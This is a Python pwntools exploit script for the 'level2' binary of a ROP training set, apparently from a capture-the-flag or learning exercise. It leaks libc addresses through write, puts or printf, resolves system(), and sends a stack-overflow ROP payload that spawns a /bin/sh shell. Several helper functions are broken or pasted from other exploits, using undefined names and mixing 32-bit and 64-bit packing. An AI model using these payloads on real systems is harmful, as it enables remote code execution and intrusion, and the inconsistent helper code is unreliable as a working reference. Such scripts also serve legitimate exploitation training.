from pwn import *
from LibcSearcher import LibcSearcher
#context.log_level = 'debug'
#context(os='linux', arch='amd64', log_level='debug')

p = process('ROP_STEP_BY_STEP-master/linux_x86/level2')
#p = remote('127.0.0.1',10001)

elf = ELF('ROP_STEP_BY_STEP-master/linux_x86/level2')

read_plt = elf.symbols['read']
print 'read_plt= ' + hex(read_plt)
write_plt = elf.symbols['write']
print 'write_plt= ' + hex(write_plt)
write_got = elf.got['write']
print 'write_got= ' + hex(write_got)
start_addr = elf.start
print 'start_addr= ' + hex(start_addr)
vulfun_addr = elf.symbols['vulnerable_function']
print 'vulfun_addr= ' + hex(vulfun_addr)

offset = 140 #return by cyclic
idle = 0

def pwnWithLibc():
  write_addr = u32(leakByWrite(write_got)) #leak write_got value, the real puts_addr
  print 'write_addr= ' + hex(write_addr)

#  libc = ELF('/lib/i386-linux-gnu/libc.so.6')
  libc = ELF('./libc-2.23.so')

  libc_base = write_addr - libc.symbols['write']
  print 'libc_base= ' + hex(libc_base)

  system_addr = libc_base + libc.symbols['system']
  print 'system_addr= ' + hex(system_addr)

  bin_addr = libc_base + libc.search('/bin/sh').next()
  print 'bin_addr= ' + hex(bin_addr)

  payload = 'a' * offset + p32(system_addr) + p32(idle) + p32(bin_addr)
  p.send(payload)

def pwnNoLibc():
  dynelf = DynELF(leakByWrite, elf=elf)
  system_addr = dynelf.lookup('system', 'libc')
  print 'system_addr= ' + hex(system_addr)

  bss_addr = elf.bss()
  print "bss_addr=" + hex(bss_addr)

  pppr = 0x80484bd  # pop,pop,pop,ret address, search by objdump or ROPgadget

  payload = 'a' * offset + p32(read_plt) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8)
  payload += p32(system_addr) + p32(idle) + p32(bss_addr)

  p.send(payload)
  p.send("/bin/sh\0")

def leakByWrite(address):
  payload = "A" * offset + p32(write_plt) + p32(start_addr) + p32(1) + p32(address) + p32(4)
  #payload = 'A' * offset + p32(puts_plt) + p32(start_addr) + p32(puts_got) #leak by puts
  p.send(payload)
  data = p.recv(4)
  print "%x => %s" % (address, (data or '').encode('hex'))
  return data

def leakByPuts(address):
  payload = "A" * 64 + "A" * 8
  payload += p64(poprdi) + p64(address)
  payload += p64(putsplt)
  payload += p64(vulfun_addr)
  payload = payload.ljust(200, "B")
  p.send(payload)
  print p.recvuntil('bye~\n')   #recv all things before puts output
  count = 0
  data = ''
  up = ""
  while True:
    c = p.recv(numb=1, timeout=0.5) # if no output following puts, return "" when timeout reach
#    c = p.recv(numb=1) # if other output following puts, need to compare this char
    count += 1
    if up == '\n' and c == "":
      data = data[:-1]
      data += "\x00"
      break
    else:
      data += c
    up = c
  data = data[:4]
  log.info("%#x => %s" % (address, (data or '').encode('hex')))
  return data

#from redhat2018 game_server
def leakByPrintf(address):
  i = 0
  data = ''
  while i < 4:
    target = address + i
    payload = 'a' * offset + p32(printf_plt) + p32(start_addr) + p32(target)
    input('b' * 0xff, 'c' * 0xff, payload)
    p.recvuntil('\nintroduce :')
    p.recvuntil('\n')
    while target > 0:
      flag = target % 0x100
      if flag == 0:
        break
      if flag == 0xa:
        p.recvuntil('\n')
      target /= 0x100
    if flag != 0:
      p.recvuntil('\n')
    tmp = p.recvuntil('Welcome to my game server', drop = True)
    for j in range(len(tmp)):
        data += tmp[j]
        i += 1
    if (len(data) < 4):
      data += '\0'
      i += 1
  print "%x => %s" % (address, (data or '').encode('hex'))
  return data  

def pwnWithSearcher():
  libc = LibcSearcher('puts', puts_addr)
  libc.add_condition(leaked_func, leaked_address)
  system_addr = puts_addr + (libc.dump('system') - libc.dump('puts'))
  print 'system_addr= ' + hex(system_addr)
  
#pwnWithLibc()
pwnNoLibc()
p.interactive()





# EXPLOIT CODE GOES HERE
#r.send(asm(shellcraft.sh()))
#r.interactive()